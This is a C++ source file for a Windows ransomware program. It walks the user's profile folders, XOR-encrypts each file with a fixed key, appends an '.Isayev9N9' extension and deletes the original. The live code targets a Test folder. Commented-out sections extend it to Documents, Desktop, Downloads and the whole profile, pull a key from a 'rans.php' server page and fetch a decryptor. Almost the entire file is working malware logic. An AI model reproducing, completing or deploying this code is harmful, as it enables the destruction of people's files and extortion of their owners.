#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include<stdbool.h>
#include <iostream>
#include <Windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <random>
/*#include <curl/curl.h>*/

namespace fs = std::filesystem;

size_t WriteCallback(char* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    size_t written;
    written = fwrite(ptr, size, nmemb, stream);
    return written;
}

/*void downloadFile(const char* url, const char* fname) {
    CURL* curl;
    FILE* fp;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        fp = fopen(fname, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}*/
bool StartsWith(const char* a, const char* b)
{
    if (strncmp(a, b, strlen(b)) == 0) return 1;
    return 0;
}
void xor_encrypt(std::string path) {
    char key[65] = "9lev1st13ewov5kbmprg84a2m5xnpqwzyxhi0ocfp13sox0y2v8rc4tz3f84s21e";
    std::ifstream input{ path,std::ios::binary };

    std::ofstream output{ path + ".Isayev9N9", std::ios::binary };
    char buffer[64];
    while (!input.eof()) {
        input.read(buffer, 64);
        for (size_t i = 0; i < 64; i++) {
            buffer[i] ^= key[i];
        }
        output.write(buffer, input.gcount());
    }
    input.close();
    std::remove(path.c_str());
}

std::vector<std::string> getDrives() {
    /*std::string p = getenv("USERPROFILE");
    p += "Desktop\decrypt.exe";
    const char* p2 = p.c_str();
    downloadFile("localhost/test.txt", p2);


    std::random_device rd{};
    std::string num = std::to_string(rd());
    CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, std::string("localhost/rans.php?numero=" + num).c_str());
    std::string key;
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &key);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_perform(curl);
    */
    std::vector<std::string> Drives;
    char* lDrives = new char[MAX_PATH]();
    if (GetLogicalDriveStringsA(MAX_PATH, lDrives));
    for (int i = 0; i < 100; i += 4)
        if (lDrives[i] != (char)0)
            Drives.push_back(std::string{ lDrives[i],lDrives[i + 1],lDrives[i + 2] });
    delete[] lDrives;
    return Drives;
}

int main() {
    std::string p = getenv("USERPROFILE");
    std::vector<std::string> lecteurs = getDrives();



    /*std::wstring widestr = std::wstring(test.begin(), test.end());
    const wchar_t* filenm = widestr.c_str();
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);*/



    for (auto lec : lecteurs) {
        for (auto& fichier : fs::recursive_directory_iterator(p + "\\Test", fs::directory_options::skip_permission_denied)) {
            try {
                if (fs::is_directory(fichier)) {
                }
                else {
                    std::cout << fichier.path().string() << std::endl;
                    xor_encrypt(fichier.path().string());

                }
            }
            catch (const std::exception& e) {
            }
        }

        /*
        for (auto& fichier : fs::recursive_directory_iterator(p + "\\Videos", fs::directory_options::skip_permission_denied)) {
            try {
                if (fs::is_directory(fichier)) {
                }
                else {
                    std::cout << fichier.path().string() << std::endl;
                    xor_encrypt(fichier.path().string());
                }
            }
            catch (const std::exception& e) {
            }
        }
        for (auto& fichier : fs::recursive_directory_iterator(p + "\\Documents", fs::directory_options::skip_permission_denied)) {
            try {
                if (fs::is_directory(fichier)) {
                }
                else {
                    std::cout << fichier.path().string() << std::endl;
                    xor_encrypt(fichier.path().string());
                }
            }
            catch (const std::exception& e) {
            }
        }
        for (auto& fichier : fs::recursive_directory_iterator(p + "\\Music", fs::directory_options::skip_permission_denied)) {
            try {
                if (fs::is_directory(fichier)) {
                }
                else {
                    std::cout << fichier.path().string() << std::endl;
                    xor_encrypt(fichier.path().string());
                }
            }
            catch (const std::exception& e) {
            }
        }
        for (auto& fichier : fs::recursive_directory_iterator(p + "\\Links", fs::directory_options::skip_permission_denied)) {
            try {
                if (fs::is_directory(fichier)) {
                }
                else {
                    std::cout << fichier.path().string() << std::endl;
                    xor_encrypt(fichier.path().string());
                }
            }
            catch (const std::exception& e) {
            }
        }
        for (auto& fichier : fs::recursive_directory_iterator(p + "\\Desktop", fs::directory_options::skip_permission_denied)) {
            try {
                if (fs::is_directory(fichier)) {
                }
                else {
                    std::cout << fichier.path().string() << std::endl;
                    xor_encrypt(fichier.path().string());
                }
            }
            catch (const std::exception& e) {
            }
        }
        for (auto& fichier : fs::recursive_directory_iterator(p + "\\Downloads", fs::directory_options::skip_permission_denied)) {
            try {
                if (fs::is_directory(fichier)) {
                }
                else {
                    std::cout << fichier.path().string() << std::endl;
                    xor_encrypt(fichier.path().string());
                }
            }
            catch (const std::exception& e) {
            }
        }
        for (auto& fichier : fs::recursive_directory_iterator(p + "\\Favorites", fs::directory_options::skip_permission_denied)) {
            try {
                if (fs::is_directory(fichier)) {
                }
                else {
                    std::cout << fichier.path().string() << std::endl;
                    xor_encrypt(fichier.path().string());
                }
            }
            catch (const std::exception& e) {
            }
        }
        for (auto& fichier : fs::recursive_directory_iterator(p, fs::directory_options::skip_permission_denied)) {
           try {
                if (fs::is_directory(fichier)) {
                } else {
                    if (!fichier.path().string().find(p + "\\AppData")) {
                    } else {
                        std::cout << fichier.path().string() << std::endl;
                        xor_encrypt(fichier.path().string());
                    }
                }
           } catch (const std::exception& e) {
           }
        }*/

    }
}
